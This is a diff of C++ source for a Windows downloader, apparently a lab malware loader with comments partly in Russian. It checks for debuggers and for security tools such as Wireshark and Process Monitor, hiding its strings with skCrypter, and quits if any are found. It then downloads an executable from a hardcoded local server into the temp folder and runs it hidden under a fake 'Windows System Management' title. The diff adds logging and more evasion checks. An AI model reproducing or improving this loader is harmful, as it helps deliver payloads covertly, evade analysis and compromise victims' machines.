@@ -10,8 +10,8 @@
 #include <shlwapi.h>
 #include <wincrypt.h>
 #include <algorithm>
-#include "skCrypter.h"  
-
+#include "skCrypter.h"
+#include <fstream>
 
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib, "wininet.lib")
@@ -21,7 +21,8 @@
 #pragma comment(lib, "ntdll.lib")
 
 #define NtCurrentProcess() ( (HANDLE)(LONG_PTR)-1)
-// Прототипы функций NtQueryInformationProcess
+
+// NtQueryInformationProcess
 extern "C" NTSTATUS NTAPI NtQueryInformationProcess(
     HANDLE ProcessHandle,
     ULONG ProcessInformationClass,
@@ -29,48 +30,98 @@ extern "C" NTSTATUS NTAPI NtQueryInformationProcess(
     ULONG ProcessInformationLength,
     PULONG ReturnLength);
 
-// Структуры для работы с NtQueryInformationProcess
 typedef struct _PROCESS_BASIC_INFORMATION {
-    ULONG PebBaseAddress; //peb
-    ULONG BasePriority; // приоритет запуска
-    ULONG UniqueProcessId; // id process 
-    ULONG InheritedFromUniqueProcessId; // id родителя ?кто нас запустил?
+    ULONG PebBaseAddress;
+    ULONG BasePriority;
+    ULONG UniqueProcessId;
+    ULONG InheritedFromUniqueProcessId;
 } PROCESS_BASIC_INFORMATION;
 
-// Проверка на наличие объекта отладки ( функция api не документированная официально,  
-// но используется антивирусами, с помощью nt_cur_process  программа проверяет саму себя *есть ли у меня отладочный объект?*
+void writeLog(const std::string& message) {
+    std::ofstream logFile("debug_log.txt", std::ios_base::app);
+    if (logFile.is_open()) {
+        logFile << message << std::endl;
+        logFile.close();
+    }
+    std::cout << message << std::endl;
+}
+
+//  антиотладочные методы
+bool detectDbgBreakPointPatch() {
+    FARPROC addr = GetProcAddress(GetModuleHandleA("ntdll.dll"), "DbgBreakPoint");
+    if (!addr) return false;
+    if (*(BYTE*)addr != 0xCC) {
+        writeLog("DbgBreakPoint patched! Debugger detected.");
+        return true;
+    }
+    writeLog("DbgBreakPoint not patched.");
+    return false;
+}
+
+bool detectIsDebuggerPresent() {
+    if (IsDebuggerPresent()) {
+        writeLog("Debugger detected by IsDebuggerPresent.");
+        return true;
+    }
+    writeLog("No debugger detected by IsDebuggerPresent.");
+    return false;
+}
+
+bool detectRemoteDebuggerPresent() {
+    BOOL isRemoteDebuggerPresent = FALSE;
+    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebuggerPresent) && isRemoteDebuggerPresent) {
+        writeLog("Debugger detected by CheckRemoteDebuggerPresent.");
+        return true;
+    }
+    writeLog("No debugger detected by CheckRemoteDebuggerPresent.");
+    return false;
+}
+
+bool detectHardwareBreakpoints() {
+    CONTEXT ctx = {};
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    HANDLE hThread = GetCurrentThread();
+
+    if (GetThreadContext(hThread, &ctx)) {
+        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
+            writeLog("Hardware breakpoints detected.");
+            return true;
+        }
+    }
+    writeLog("No hardware breakpoints detected.");
+    return false;
+}
+
 bool detectDebuggerByDebugObject() {
     HANDLE hDebObj = NULL;
-    NTSTATUS status = NtQueryInformationProcess(NtCurrentProcess(), 0x1E, &hDebObj, sizeof(hDebObj), NULL); 
+    NTSTATUS status = NtQueryInformationProcess(NtCurrentProcess(), 0x1E, &hDebObj, sizeof(hDebObj), NULL);
 
     if (status == 0x00000000 && hDebObj) {
-        std::cout << "флаг детект " << std::endl; // будет доработано
+        writeLog("Debugger detected by DebugObject!");
         return true;
     }
+    writeLog("No debugger detected by DebugObject.");
     return false;
 }
 
-// Проверка флага отладки 
 bool detectDebuggerByProcessDebugFlags() {
     ULONG NoDebugInherit = 0;
-    NTSTATUS status = NtQueryInformationProcess(NtCurrentProcess(), 0x1F, &NoDebugInherit, sizeof(NoDebugInherit), NULL);  
+    NTSTATUS status = NtQueryInformationProcess(NtCurrentProcess(), 0x1F, &NoDebugInherit, sizeof(NoDebugInherit), NULL);
 
     if (status == 0x00000000 && NoDebugInherit == 0) {
-        std::cout << "флаг детект  " << std::endl; // будет доработано
+        writeLog("Debugger detected by ProcessDebugFlags!");
         return true;
     }
+    writeLog("No debugger detected by ProcessDebugFlags.");
     return false;
 }
 
-// Проверка родительского процесса
 bool detectParentProcess() {
     PROCESS_BASIC_INFORMATION baseInf;
-    NTSTATUS status = NtQueryInformationProcess(NtCurrentProcess(), 0, &baseInf, sizeof(baseInf), NULL);  
+    NTSTATUS status = NtQueryInformationProcess(NtCurrentProcess(), 0, &baseInf, sizeof(baseInf), NULL);
 
     if (status == 0x00000000) {
         DWORD parentProcessId = baseInf.InheritedFromUniqueProcessId;
-
-        // Получаем имя родительского процесса
         HANDLE hParentProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, parentProcessId);
         if (hParentProcess) {
             DWORD dwSize = MAX_PATH;
@@ -78,13 +129,10 @@ bool detectParentProcess() {
             if (QueryFullProcessImageNameA(hParentProcess, 0, parentProcessName, &dwSize)) {
                 std::string parentName(parentProcessName);
                 std::transform(parentName.begin(), parentName.end(), parentName.begin(), ::tolower);
-
-                // Проверяем, не является ли родительским процессом отладчик
                 if (parentName.find("ollydbg.exe") != std::string::npos ||
                     parentName.find("x64dbg.exe") != std::string::npos ||
-                    parentName.find("x32dbg.exe") != std::string::npos ||
-                    parentName.find("explorer.exe") != std::string::npos) {
-                    std::cout << "Debugger detected by Parent Process!" << std::endl;
+                    parentName.find("x32dbg.exe") != std::string::npos) {
+                    writeLog("Debugger detected by Parent Process!");
                     CloseHandle(hParentProcess);
                     return true;
                 }
@@ -92,10 +140,10 @@ bool detectParentProcess() {
             CloseHandle(hParentProcess);
         }
     }
+    writeLog("No debugger detected by Parent Process.");
     return false;
 }
 
-// Проверка на наличие отладчиков
 bool detectSecurityTools() {
     const wchar_t* tools[] = {
         skCrypt(L"wireshark"), skCrypt(L"procmon"), skCrypt(L"processhacker"),
@@ -104,36 +152,51 @@ bool detectSecurityTools() {
     };
 
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) return false;
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        writeLog("Failed to create process snapshot for security tools check.");
+        return false;
+    }
 
     PROCESSENTRY32W pe32;
     pe32.dwSize = sizeof(PROCESSENTRY32W);
+    bool detected = false;
 
     if (Process32FirstW(hSnapshot, &pe32)) {
         do {
             std::wstring procName = pe32.szExeFile;
             std::transform(procName.begin(), procName.end(), procName.begin(), ::tolower);
-
             for (const auto& tool : tools) {
                 if (procName.find(tool) != std::wstring::npos) {
-                    CloseHandle(hSnapshot);
-                    return true;
+                    writeLog("Security tool detected: " + std::string(procName.begin(), procName.end()));
+                    detected = true;
+                    break;
                 }
             }
+            if (detected) break;
         } while (Process32NextW(hSnapshot, &pe32));
     }
 
     CloseHandle(hSnapshot);
-    return false;
+    if (!detected) writeLog("No security tools detected.");
+    return detected;
 }
 
-// Зашифрованный URL для скачивания
+
+bool detectDebuggerAll() {
+    return detectIsDebuggerPresent() ||
+        detectRemoteDebuggerPresent() ||
+        detectHardwareBreakpoints() ||
+        detectDbgBreakPointPatch() ||
+        detectDebuggerByDebugObject() ||
+        detectDebuggerByProcessDebugFlags() ||
+        detectParentProcess();
+}
+
 std::wstring getDownloadURL() {
-    auto url = skCrypt(L"адрес локалки  kali.http");
-    return url.decrypt(); // Возвращаем расшифрованную строку
+    auto url = skCrypt(L"http://192.168.100.1:8080/Autoruns.exe");
+    return url.decrypt();
 }
 
-// Проверка интернет-соединения
 bool checkInternetConnection() {
     const wchar_t* servers[] = {
         skCrypt(L"https://www.google.com"),
@@ -143,19 +206,21 @@ bool checkInternetConnection() {
 
     for (const auto& server : servers) {
         if (InternetCheckConnectionW(server, FLAG_ICC_FORCE_CONNECTION, 0)) {
+            writeLog("Internet connection detected.");
             return true;
         }
     }
 
+    writeLog("No internet connection detected.");
     return false;
 }
 
-// Загрузка файла без шифрования
 bool downloadFile(const std::wstring& url, const std::wstring& savePath) {
-    return URLDownloadToFileW(NULL, url.c_str(), savePath.c_str(), 0, NULL) == S_OK;
+    bool result = (URLDownloadToFileW(NULL, url.c_str(), savePath.c_str(), 0, NULL) == S_OK);
+    writeLog(std::string("Download file result: ") + (result ? "Success" : "Failed"));
+    return result;
 }
 
-// Запуск скачанного файла
 bool executeFile(const std::wstring& filePath) {
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
@@ -163,56 +228,61 @@ bool executeFile(const std::wstring& filePath) {
     si.wShowWindow = SW_HIDE;
 
     BOOL result = CreateProcessW(filePath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-
     if (result) {
         WaitForSingleObject(pi.hProcess, INFINITE);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
+        writeLog("Executed file successfully: " + std::string(filePath.begin(), filePath.end()));
     }
-
+    else {
+        writeLog("Failed to execute file: " + std::string(filePath.begin(), filePath.end()));
+    }
     return result;
 }
 
 int main() {
     srand(static_cast<unsigned int>(time(NULL) ^ GetCurrentProcessId()));
-
-    // Установим зашифрованный заголовок консоли
     auto consoleTitle = skCrypt(L"Windows System Management");
     SetConsoleTitleW(consoleTitle);
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
 
-    // Проверка на отладчик
-    if (detectDebuggerByDebugObject() || detectDebuggerByProcessDebugFlags() || detectParentProcess()) {
+    char currentDir[MAX_PATH];
+    if (GetCurrentDirectoryA(MAX_PATH, currentDir)) {
+        std::cout << "Current directory for logs: " << currentDir << std::endl;
+        writeLog(std::string("Current directory for logs: ") + currentDir);
+    }
+    else {
+        std::cout << "Failed to get current directory." << std::endl;
+    }
+
+    if (detectDebuggerAll()) {
+        writeLog("Exiting due to debugger detection.");
         return 0;
     }
 
-    // Проверка наличия подозрительных процессов
     if (detectSecurityTools()) {
+        writeLog("Exiting due to security tool detection.");
         return 0;
     }
 
-    // Проверка интернет-соединения
-    if (!checkInternetConnection()) {
+   
+    wchar_t tempPath[MAX_PATH];
+    if (GetTempPathW(MAX_PATH, tempPath) == 0) {
+        writeLog("Failed to get temp path.");
         return 1;
     }
 
-    wchar_t tempPath[MAX_PATH];
-    if (GetTempPathW(MAX_PATH, tempPath) == 0) return 1;
-
-    // Расшифровка пути для сохранения файла
     auto encryptedSavePath = skCrypt(L"autoruns.exe");
     std::wstring savePath = std::wstring(tempPath) + encryptedSavePath.decrypt();
     std::wstring downloadURL = getDownloadURL();
 
-    // Загрузка файла
     if (!downloadFile(downloadURL, savePath)) {
+        writeLog("Exiting due to failed download.");
         return 1;
     }
 
-    // Выполнение скачанного файла
     if (!executeFile(savePath)) {
+        writeLog("Exiting due to failed execution.");
         return 1;
-        system("pause");
     }
 
     return 0;
